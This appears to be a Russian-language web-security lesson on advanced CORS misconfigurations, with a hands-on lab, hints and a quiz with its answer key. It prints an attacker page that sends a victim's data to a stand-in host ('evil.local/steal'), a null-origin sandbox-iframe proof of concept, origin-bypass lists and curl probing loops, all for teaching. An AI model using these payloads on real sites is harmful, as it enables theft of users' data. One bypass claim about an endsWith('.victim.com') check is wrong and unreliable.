---
id: web-cors-deep
title: "CORS advanced: null origin, regex bypass, credentials, internal networks"
category: web
parent: web-browser-core
difficulty: medium
order: 3
tags: [cors, misconfig, null-origin, credentials, regex-bypass]
prerequisites: [web-same-origin-cors, web-browser-security]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Продвинутые ошибки CORS: доверие null, обход regex-валидации, работа с credentials и доступ к внутренним сетям."
lab:
  kind: shell
  title: "Практика: отражение Origin с credentials"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Подставь чужой Origin: curl -s -i https://api.shop.local/me -H 'Origin: https://evil.local' -b 'session=victim'"
    - "Смотри на Access-Control-Allow-Origin и Access-Control-Allow-Credentials."
    - "Если ACAO отражает твой origin, а ACAC: true — данные читаются с cookie жертвы."
    - "Сохрани ответ: добавь > found.txt и набери check."

---

## Вопрос, с которого всё начинается

Мы знаем: SOP не даёт странице `evil.com` прочитать ответ от `api.victim.com`. Но у сервера есть способ **разрешить** такое чтение — механизм CORS. И если он настроен с ошибкой, чужой сайт сможет читать данные пользователя **с его сессией**.

Вопрос: как именно ошибаются в настройке CORS, и как эти ошибки эксплуатировать? Сегодня разберём это на одном API и пройдём от первого `curl` до полноценной кражи данных.

## Наш пример: API магазина

Есть API `api.shop.local`. Оно должно отдавать данные только своему фронтенду `https://shop.local`. Проверим, как оно реагирует на **чужой** origin — просто подставим `Origin: https://evil.local`:

```bash
$ curl -sI https://api.shop.local/me -H 'Origin: https://evil.local' | grep -i access-control
access-control-allow-origin: https://evil.local
access-control-allow-credentials: true
```

Вот это и есть дыра. Заголовок `Access-Control-Allow-Origin` (ACAO) вернул **наш** origin, а `Access-Control-Allow-Credentials: true` (ACAC) разрешил cookie. Это значит: сервер слепо отражает любой origin.

## Шаг 1: как работает CORS

Разберём заголовки, которые участвуют в обмене:

| Заголовок | Смысл |
|-----------|-------|
| `Access-Control-Allow-Origin` | разрешённый origin (или `*`) |
| `Access-Control-Allow-Credentials` | разрешить cookie/Authorization |
| `Access-Control-Allow-Methods` | разрешённые методы |
| `Access-Control-Allow-Headers` | разрешённые заголовки |
| `Vary: Origin` | кэшировать ответ по origin |

Ключевое ограничение: комбинация `ACAO: *` и `ACAC: true` **запрещена** браузером. Поэтому если нужны credentials, сервер обязан отражать **конкретный** origin — и именно здесь начинаются ошибки.

## Шаг 2: кража данных через отражение

Проверим, что данные приватные (отдаются с cookie):

```bash
$ curl -s 'https://api.shop.local/me' -b 'session=abc' -H 'Origin: https://evil.local'
{"email":"victim@shop.local","orders":[...]}
```

Сервер вернул данные с нашей сессией и разрешил чтение чужому origin. Собираем страницу атакующего:

```html
<script>
fetch('https://api.shop.local/me', {credentials:'include'})
  .then(r=>r.text()).then(t=>fetch('https://evil.local/steal?d='+encodeURIComponent(t)));
</script>
```

Жертва открывает страницу — её данные уходят на `evil.local`. `credentials:'include'` заставляет браузер приложить cookie жертвы. Артефакт — приватные данные на нашем сервере.

## Шаг 3: `null` origin

Заголовок `Origin: null` приходит из **песочниц** (`sandbox`-iframe), `data:`/`file:` документов и некоторых редиректов. Если сервер доверяет `null` — атакующий использует это через sandbox-iframe:

```bash
$ curl -sI https://api.shop.local/me -H 'Origin: null' | grep -i access-control
access-control-allow-origin: null
access-control-allow-credentials: true
```

```html
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://api.shop.local/me',{credentials:'include'}).then(r=>r.text()).then(t=>parent.postMessage(t,'*'))</script>"></iframe>
```

Песочница даёт документу «непрозрачный» origin `null`, и если сервер его отражает — доступ открыт.

## Шаг 4: обход regex-проверки

Часто сервер не отражает всё подряд, а проверяет origin — но делает это наивно. Ломается на любой проверке, которая не сверяет строку целиком:

```bash
# проверка endsWith('.victim.com')
Origin: https://evil.victim.com.attacker.com     -> проходит
# проверка startsWith('https://victim.com')
Origin: https://victim.com.attacker.com          -> проходит
# проверка contains('victim.com')
Origin: https://attacker.com/victim.com          -> проходит
```

Правило: пробуй варианты с суффиксом, префиксом, подстрокой, с портом (`:1337`), с другой схемой (`http://`) и в другом регистре. Правильная проверка — только точное сравнение (`===`) или `endsWith('.victim.com')` **с** проверкой схемы.

## Шаг 5: доверие поддомену с XSS

Если сервер доверяет `*.shop.local`, а на любом поддомене есть XSS или subdomain takeover — защита обходится через этот поддомен. Проверим список доверенных origin:

```bash
$ for o in https://staging.shop.local https://dev.shop.local https://old.shop.local; do
>   curl -sI https://api.shop.local/me -H "Origin: $o" | grep -i access-control-allow-origin; done
access-control-allow-origin: https://staging.shop.local
```

«Забытый» `staging` с XSS — типичная точка входа. Доверие к поддомену — доверие ко всему, что на нём живёт.

## Шаг 6: `Vary` и кэш

CORS связан с кэшированием. Если ответ содержит ACAO, но **без** `Vary: Origin`, промежуточный кэш (CDN, reverse proxy) может закэшировать ответ с origin одного клиента и отдать его другому:

```bash
$ curl -sI https://api.shop.local/public -H 'Origin: https://a.com' | grep -i allow-origin
access-control-allow-origin: https://a.com
$ curl -sI https://api.shop.local/public -H 'Origin: https://b.com' | grep -i allow-origin
access-control-allow-origin: https://a.com    # кэш отдал чужой ACAO
```

Атакующий «прогревает» кэш своим origin, а жертва получает уже подменённый ACAO.

## Шаг 7: CORS как путь во внутреннюю сеть

Особенно опасно, когда интернет-приложение **проксирует** внутренние сервисы. Тогда слабый CORS даёт браузеру жертвы читать внутренние API, недоступные снаружи:

```bash
$ curl -sI 'https://app.shop.local/proxy/internal/status' -H 'Origin: https://evil.local' | grep -i allow-origin
access-control-allow-origin: https://evil.local
```

Сам запрос делает браузер жертвы, но данные внутренней системы утекают наружу. Такие находки оценивают как критичные.

## Если не сработало

- `ACAO: *` без credentials — проверь, отдаёт ли эндпоинт чувствительные данные **без** cookie (иногда API доверяет заголовкам, а не сессии).
- Отражения нет, но нет и `Vary: Origin` — проверь кэш: возможно, ACAO подменяется через «прогрев».
- Credentials не уходят — проверь атрибут `SameSite` у cookie: `Lax`/`Strict` могут блокировать кросс-сайтовые запросы.
- Всё закрыто — переходи к соседним клиентским каналам: `postMessage`, XS-Leaks.

## Preflight и автоматизация

Для «непростых» запросов (нестандартные заголовки, методы кроме `GET`/`POST`/`HEAD`) браузер сначала шлёт **preflight** — запрос `OPTIONS`, спрашивающий разрешение. Если preflight отвечает разрешительно для чужого origin, а фактический запрос тоже — уязвимость подтверждена:

```bash
$ curl -sI -X OPTIONS https://api.shop.local/me \
>   -H 'Origin: https://evil.local' \
>   -H 'Access-Control-Request-Method: DELETE' \
>   -H 'Access-Control-Request-Headers: authorization' | grep -i access-control
access-control-allow-origin: https://evil.local
access-control-allow-methods: DELETE
```

На большом scope ручной перебор утомляет — используй `nuclei -tags cors` и короткий цикл по вариантам origin:

```bash
$ cat > origins.txt <<'EOF'
https://evil.local
null
https://shop.local.evil.local
https://evil-shop.local
http://shop.local
https://shop.local:1337
EOF
$ while read o; do
>   r=$(curl -sI https://api.shop.local/me -H "Origin: $o" | grep -i 'access-control-allow-origin' | tr -d '\r')
>   [ -n "$r" ] && echo "$o -> $r"
> done < origins.txt
```

Каждая строка в выводе — origin, который сервер отражает, то есть потенциальная точка эксплуатации.

## Что мы теперь знаем

- CORS — исключение из SOP, разрешающее кросс-доменное чтение.
- `ACAO: *` + `ACAC: true` запрещено; для credentials сервер обязан отражать конкретный origin.
- Отражение произвольного origin с credentials — критичная утечка.
- `Origin: null` из песочниц часто доверяют ошибочно.
- Regex/подстрочные проверки ломаются суффиксом, префиксом, подстрокой, портом, схемой.
- Доверие поддомену = доверие любому XSS на нём.
- Без `Vary: Origin` кэш может подменить ACAO; прокси-эндпоинты открывают внутреннюю сеть.

## На что смотреть дальше

- Сразу подставляй `Origin: https://evil.com` и смотри, вернётся ли он в ACAO.
- Проверяй credentials: есть ли `ACAC: true` и уходит ли сессия.
- Не забывай `Origin: null` через sandbox-iframe.
- Перебирай байпасы: суффикс, префикс, подстрока, регистр, порт, схема.
- Проверяй `Vary: Origin` — его отсутствие тихий, но реальный баг.
- Оформляй PoC страницей, которая реально крадёт данные, а не описанием.

## Квиз

Проверь себя.

```quiz
- question: "Откуда берётся `Origin: null`?"
  options:
    - "Из sandbox-iframe, `data:`/`blob:` документов, `file://`"
    - "Из HTTPS-сайтов"
    - "Из DNS"
    - "Из cookie"
  answer: 0
  explanation: "Эти контексты дают непрозрачный/нулевой origin."
- question: "Какой домен обходит проверку `origin.endsWith('example.com')`?"
  options:
    - "`https://attackerexample.com`"
    - "`https://example.com.attacker.net`"
    - "`https://attacker.net`"
    - "`https://sub.attacker.net`"
  answer: 0
  explanation: "Строка заканчивается на `example.com`, поэтому проверка пропускает её."
- question: "Что нужно для чтения приватных данных через CORS?"
  options:
    - "Отражение origin + `Access-Control-Allow-Credentials: true`"
    - "Только `ACAO: *`"
    - "Только cookie"
    - "Только HTTPS"
  answer: 0
  explanation: "Credentials-режим требует `ACAC: true` и отражённого origin."
- question: "Как CORS помогает сканировать внутреннюю сеть?"
  options:
    - "Браузер жертвы обращается к внутренним адресам, а CORS отдаёт ответ атакующему"
    - "Он меняет DNS"
    - "Он шифрует трафик"
    - "Он открывает порты на сервере"
  answer: 0
  explanation: "Это CORS-based SSRF из браузера жертвы."
- question: "Какая проверка CORS корректна?"
  options:
    - "Точное сравнение origin или `endsWith('.example.com')` с проверкой схемы"
    - "`includes('example.com')`"
    - "`startsWith('http')`"
    - "Разрешить всем"
  answer: 0
  explanation: "Нужна граница домена, а не подстрока."
```

## Куда дальше

В следующем уроке мы разберём ещё один канал межоконного взаимодействия — **postMessage и tabnabbing** (`web-postmessage-tabnabbing`): как ошибки в проверке `origin` дают DOM XSS, а `target=_blank` без `noopener` — подмену вкладки. А пока главное запомни: CORS, разрешающий чтение, — это осознанное ослабление SOP, и любая неточность в нём превращается в кражу данных.

## Где пригодится

- **CTF (Web):** CORS-мисконфиг с хитрым whitelist — типичная задача.
- **Bug bounty:** отражение origin с credentials — топ-класс выплат.
- **Пентест:** аудит API-доменов и внутренних сервисов через браузер.
- **Работа (AppSec/Dev):** строгий whitelist, обработка `null`, отказ от regex-подстрок.
